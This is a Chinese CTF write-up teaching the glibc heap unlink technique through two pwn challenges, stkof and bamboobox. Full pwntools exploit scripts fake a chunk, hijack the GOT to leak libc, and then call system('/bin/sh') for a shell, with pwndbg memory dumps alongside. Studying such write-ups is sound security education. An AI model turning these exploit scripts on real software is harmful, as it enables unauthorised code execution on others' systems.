
## 利用思路（UNLINK）

### 条件

1. UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 `fd` 和 `bk` 指针

2. 已知位置存在一个指针指向可进行 UAF 的 chunk

### 效果

使得已指向 UAF chunk 的指针 `ptr` 变为 `ptr - 0x18`

### 思路

设指向可 UAF chunk 的指针的地址为 `ptr`

1. 修改 `fd` 为 `ptr - 0x18`
2. 修改 `bk` 为 `ptr - 0x10`
3. 触发 `unlink`

`ptr` 处的指针会变为 `ptr - 0x18`。

## 本题思路概述

先利用堆溢出伪造 chunk 用于形成 unlink #2 #3。接着更改 `free` 的 `got` 表为 `puts` 的 `got` 表 #2。再将用于修改 `got` 表的 chunk 的上一个 chunk 写入 `puts` 的 `plt` 表。这样当我们去释放用于修改 `got` 表的 chunk 的时候，就会去执行 `puts` 函数，里面的参数就是 `puts` 的 `got` 表，就可以得到 libc。有 libc 我们可以直接写入 `system('/bin/sh')`。

### 第一步 unlink

本题中的 `ptr` 是对应要修改 chunk 的指针地址。从 ida 中我们可以得知他的 chunk 是存放在 `bss` 段的一个全局数组里面的。我们要修改 chunk2 就要做到 chunk2 相对于数组首地址的偏移。

我们先上个调试。我创建 3 个堆，首地址存放了 chunk 的数量，然后 chunk1 在 `0x602140`，chunk2 在 `0x602150`，chunk3 在 `0x602158`。

```text
pwndbg> x/32gx 0x602100
0x602100: 0x0000000000000003    0x0000000000000000
0x602110: 0x0000000000000000    0x0000000000000000
0x602120: 0x0000000000000000    0x0000000000000000
0x602130: 0x0000000000000000    0x0000000000000000
0x602140: 0x0000000000000000    0x0000000000e05420
0x602150: 0x0000000000e05870    0x0000000000e058c0
```

根据利用规则：

`fd = ptr - 0x18`

`bk = ptr - 0x10`

这样就可以绕过 `unlink` 的检测。

```python
add(0x20) #1
add(0x30) #2
add(0x80) #3
add(0x30) #4
```

我们先构造 fake chunk 用于绕过 `unlink` 的非法检测。注意哦，chunk3 大小必须大于 fastbin 的大小不然是不会进入 unsortedbin，然后这里是 Ubuntu16 的系统不需要考虑 tcache。

```python
p1 = p64(0) #prev_size
p1 += p64(0x30) #fake chunk_size
p1 += p64(fd) + p64(bk)
p1 += 'a'*0x10 #junk code
p1 += p64(0x30) #prev_size
p1 += p64(0x90)
'''fake chunk_size insure位置为0欺骗程序让程序误认为前面的chunk被释放了'''
edit(2, p1)
free(3) #unlink
```

`unlink` 后的效果，很明显的可以看见 chunk2 和 fake chunk 有重叠的部分。fake chunk 是 c1，他的 `fd` `bk` 指针在 9470 这里开始，我们等下就可以往这里写入 `got` 表。

```text
pwndbg> x/32gx 0x14a9450
0x14a9450: 0x0000000000000000    0x0000000000000041
0x14a9460: 0x0000000000000000    0x00000000000000c1
0x14a9470: 0x00007f1ac4923b78    0x00007f1ac4923b78
0x14a9480: 0x6161616161616161    0x6161616161616161
0x14a9490: 0x0000000000000030    0x0000000000000090
0x14a94a0: 0x0000000000000000    0x0000000000000000
0x14a94b0: 0x0000000000000000    0x0000000000000000
0x14a94c0: 0x0000000000000000    0x0000000000000000
0x14a94d0: 0x0000000000000000    0x0000000000000000
0x14a94e0: 0x0000000000000000    0x0000000000000000
0x14a94f0: 0x0000000000000000    0x0000000000000000
```

### 第二步 泄露 libc

从上面的代码块可以看出 fake chunk 我们应该怎么去填充构造更改 `got` 表。

```python
p2 = 'b'*0x10 + p64(free_got) + p64(puts_got)
edit(2, p2)
p3 = p64(puts_plt)
edit(1, p3)
free(2)
leak = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
log.success('leak:' + hex(leak))
base = leak - 0x06f6a0
sys = base + 0x0453a0
binsh = base + 0x18ce17
```

### 第三步 getshell

```python
edit(1, p64(sys))
edit(4, '/bin/sh\x00')
free(4)
r.interactive()
```

### tips:

值得一提的是，当我们有 2 个相邻的 chunk（这里的相邻指得是这样的，例如有 chunk 1 2 3 4，当 2 3 被 `free` 了那么 1 4 就相邻了）。如果我 1 中的 `fd` 指针指向某个函数的地址，然后与其相邻的 chunk 里面的 `fd` `bk` 就是作为参数的。参数位数不够的可以向该 chunk 后面的内容区块拿来利用，然后释放相邻 chunk 就会执行函数。

说人话就是：1 号 chunk 就是函数的调用 chunk，与之相邻的 chunk 是参数 chunk，释放参数 chunk 就可以执行函数。例如 1 号存放 `system` 的真实地址，4 号存放 `'/bin/sh\x00'`，`free(4)` 就可以执行 `system('/bin/sh')`。

### exp:

```python
from pwn import *
r = process('./stkof')
libc = ELF('./libc-2.23.so')
elf = ELF('stkof')
context.log_level = 'debug'
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
free_got = elf.got['free']
#r=remote('node4.buuoj.cn','29385')
def debug(cmd=''):
     gdb.attach(r,cmd)
def add(size):
    r.sendline("1")
    r.sendline(str(size))
    r.recvuntil("OK\n")
def free(idx):
    r.sendline("3")
    r.sendline(str(idx))
def edit(idx,strings):
    r.sendline("2")
    r.sendline(str(idx))
    r.sendline(str(len(strings)))
    r.send(strings)
    r.recvuntil("OK\n")
target = 0x602140 + 0x10 #global[2]
fd = target - 24
bk = target - 16
add(0x20)#1
add(0x30)#2
add(0x80)#3
add(0x30)#4
p1=p64(0)#prev_size
p1+=p64(0x30)#fake chunk_size
p1+=p64(fd)+p64(bk)
p1+='a'*0x10#junk code
p1+=p64(0x30)#prev_size
p1+=p64(0x90)#fake chunk_size
edit(2,p1)
free(3)#unlink
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
free_got = elf.got['free']
#atoi_got = elf.got['atoi']
p2 = 'b'*0x10 + p64(free_got)+p64(puts_got)
edit(2, p2) #target-0x8
p3 = p64(puts_plt)
edit(1, p3) #global[1]
free(2)     #chu fa
leak = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
log.success('leak:'+hex(leak))
base=leak-0x06f6a0
sys=base+0x0453a0
binsh=base+0x18ce17
edit(1,p64(sys))
edit(4,'/bin/sh\x00')
free(4)
r.interactive()
```

## 2.hitcontraining_bamboobox(堆溢出+unlink)

QWQ 和上面一样啦。不过这个给了 `show` 函数咋们就不用构造 put 了，直接用 `show` 打印就可以泄露 `libc` 啦。不过这里我们需要注意一点，也是刚才没注意到的。

```python
payload = p64(0) * 2
payload += p64(0x40) + p64(free_got)
edit(0, len(payload), payload)
```

unlink 后形成的 chunk 我们再去写入的话不是写到 chunk 上了，是写到堆存放的数组上去啦，如下代码块所示，`0x602018` 就是 `free` 的 `got` 表地址，`0x40` 是 chunk0 的大小。

我们要填充 `payload = p64(0) * 2` 的原因是因为此时 `ptr = ptr - 0x18`。我们不难看出要想骗过程序检测还要修改 chunk 的大小标识，所以补上 `0x10` 就是 `ptr - 0x8`，`ptr` 就是 `0x6020c8`（具体是为什么我在第一题 unlink 中有提到）。所以 `ptr - 0x8` 就是数组首地址可以让我们去控制他的大小标识，绕过检测完美哦。其他的话就没什么好说的了。

```text
pwndbg> x/32gx 0x6020C0
0x6020c0 <itemlist>: 0x0000000000000040    0x0000000000602018
0x6020d0 <itemlist+16>: 0x0000000000000000    0x0000000000000000
0x6020e0 <itemlist+32>: 0x0000000000000080    0x00000000006f3110
0x6020f0 <itemlist+48>: 0x0000000000000020    0x00000000006f31a0
0x602100 <itemlist+64>: 0x0000000000000000    0x0000000000000000
```

```python
from pwn import *
r=process('./bamboobox')
#r=remote('node4.buuoj.cn','27243')
from LibcSearcher import *
context.log_level='debug'
context.os='linux'
context.arch='amd64'
elf=ELF('./bamboobox')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
free_got = elf.got['free']

def add(length,context):
    r.sendlineafter('Your choice:',str(2))
    r.sendlineafter('Please enter the length of item name:',str(length))
    r.sendafter('Please enter the name of item:',str(context))

def dele(idx):
    r.sendlineafter('Your choice:',str(4))
    r.sendlineafter('Please enter the index of item:',str(idx))

def edit(idx,length,context):
    r.sendlineafter('Your choice:',str(3))
    r.sendlineafter('Please enter the index of item:',str(idx))
    r.sendlineafter('Please enter the length of item name:',str(length))
    r.sendafter('Please enter the new name of the item:',str(context))
def show():
    r.recvuntil("Your choice:")
    r.sendline(str(1))

fd=0x6020c8-0x18
bk=0x6020c8-0x10
add(0x40,'a')#0
add(0x80,'a')#1
add(0x80,'a')#2
add(0x20,'/bin/sh\x00')#3
payload=p64(0)+p64(0x41)+p64(fd)+p64(bk)+'a'*0x20+p64(0x40)+p64(0x90)
edit(0,len(payload),payload)
dele(1)
payload = p64(0) * 2
payload += p64(0x40) + p64(free_got)
edit(0,len(payload),payload)
gdb.attach(r)
show()
leak = u64(r.recvuntil("\x7f")[-6:]+'\x00\x00')
log.success(hex(leak))

libc=LibcSearcher('free',leak)
base=leak-libc.dump('free')
sys=base+libc.dump('system')

edit(0,len(p64(sys)),p64(sys))
dele(3)
r.interactive()
```

## 3.UAF hacknote
